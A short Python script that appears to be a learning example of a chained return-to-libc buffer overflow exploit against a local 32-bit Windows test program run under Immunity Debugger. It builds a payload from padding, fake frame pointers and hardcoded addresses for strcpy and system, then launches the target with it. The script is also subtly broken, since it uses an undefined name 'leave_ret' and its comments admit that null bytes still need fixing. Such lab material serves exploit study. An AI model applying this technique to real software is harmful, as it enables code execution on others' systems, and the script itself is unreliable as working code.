#!/usr/bin/python
#Simple return to libc chained example of exploitation for a Windows 32 bit PE
#Author: Pepitoex123

import subprocess
import struct

def le(number):
	return struct.pack("<I",number)
febp0 = 0xff28ff9c #Really starts with 0x00
febp1 = 0xff28ffa8 #Really starts with 0x00
leave_return = 0x75719985
strcpy_addr = 0x75728d6e
system_addr = 0x7576b177
null_str = 0x757101f8

param = "c:\\program files (x86)\\immmunity inc\\immunity debugger\\immunitydebugger.exe"
param += " bufferOverflow "
#Offset of 30 bytes
param += 30 * "A"
#frame0
param += le(febp0)
param += le(leave_return)
#frame1(call strcpy to get null bytes)
param += le(strcpy_addr)
param += le(leave_return)
param += le(0xff28ff9f) # must change ff to 00
param += le(null_str)
#frame2
param += le(strcpy_addr)
param += le(leave_ret)

param += chr(0xe0) + chr(0x95) + chr(0xc4) + chr(0x75)
param += "AAAABBBBCCCC"
print(param)
subprocess.call(param)
